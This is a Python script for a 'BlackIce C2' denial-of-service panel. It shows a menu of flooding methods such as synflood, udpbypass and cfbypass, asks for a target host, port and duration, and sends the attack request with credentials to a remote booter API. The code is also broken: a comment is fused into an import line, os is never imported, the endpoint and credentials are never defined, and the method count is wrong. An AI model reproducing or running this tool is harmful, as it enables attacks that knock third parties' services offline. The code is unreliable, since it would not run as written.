import requests
import time
import List of attack methods
ATTACK_METHODS = [
    "homehold", "synflood", "discord", "telegram", "openvpn", "tcpkill", "tcpmix", "udpgostorm", "ovh",
    "ssh", "tcpboom", "udpbypass", "stun", "mixamp", "homekill", "dns", "game", "fivem", "tls", "http",
    "httpsbypass", "browser", "cfbypass"
]

# Clear screen function
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Display menu
def display_menu():
    clear_screen()
    print("\033[38;5;51m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("               🚀 \033[1;36mBLACKICE C2 PANEL\033[0m 🚀")
    print("\033[38;5;51m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")

    # New ASCII Art
    print("""
\033[1;34mBlackIce C2                     |     | 
                                \\_V_//
                                \/=|=\/
                                 [=v=]
                               __\\___/_____
                              /..[  _____  ]
                             /_  [ [  M /] ]
                            /../.[ [ M /@] ]
                           <-->[_[ [M /@/] ]
                          /../ [.[ [ /@/ ] ]
     _________________]\\ /__/  [_[ [/@/ C] ]
    <_________________>>0---]  [=\\ \\@/ C / /
       ___      ___   ]/000o   /__\\ \\ C / /
          \\    /              /....\\ \\_/ /
       ....\\||/....           [___/=\\___/
      .    .  .    .          [...] [...]
     .      ..      .         [___/ \\___]
     .    0 .. 0    .         <---> <---> 
  /\\/\\.    .  .    ./\\/\\      [..]   [..]
 / / / .../|  |\\... \\ \\ \\    _[__]   [__]_
/ / /       \\/       \\ \\ \\  [____>   <____]\033[0m
""")

    print("\033[38;5;51m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")

    # Display attack methods in a structured format
    columns = 3
    for i in range(0, len(ATTACK_METHODS), columns):
        row = []
        for j in range(columns):
            if i + j < len(ATTACK_METHODS):
                method = ATTACK_METHODS[i + j]
                row.append(f"\033[1;33m[\033[1;32m{i + j + 1}\033[1;33m] \033[1;37m{method}\033[0m")
        print("   ".join(row))

    print("\033[38;5;51m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")

# Get user input
def get_input():
    try:
        choice = int(input("\n➡️ \033[1;36mSelect attack method (1-24): \033[0m"))
        if 1 <= choice <= len(ATTACK_METHODS):
            method = ATTACK_METHODS[choice - 1]
            host = input("\n🎯 \033[1;36mTarget (IP/Host): \033[0m")
            port = input("🚪 \033[1;36mPort: \033[0m")
            time = input("🕒 \033[1;36mDuration (seconds): \033[0m")

            print("\n🚀 \033[1;32mLaunching attack...\033[0m")
            send_attack(method, host, port, time)
        else:
            print("\n❌ \033[1;31mInvalid selection.\033[0m")
            time.sleep(2)
            main()
    except ValueError:
        print("\n❌ \033[1;31mInvalid input.\033[0m")
        time.sleep(2)
        main()

# Send attack request
def send_attack(method, host, port, duration):
    url = API_ENDPOINT.format(
        USERNAME=USERNAME,
        PASSWORD=PASSWORD,
        HOST=host,
        PORT=port,
        TIME=duration,
        METHOD=method
    )
    response = requests.get(url)

    if response.status_code == 200:
        print(f"\n✅ \033[1;32mAttack launched on {host}:{port} using {method} for {duration} seconds!\033[0m")
    else:
        print(f"\n❌ \033[1;31mError: {response.text}\033[0m")

    time.sleep(3)
    main()

# Main function
def main():
    display_menu()
    get_input()

if __name__ == "__main__":
    main()
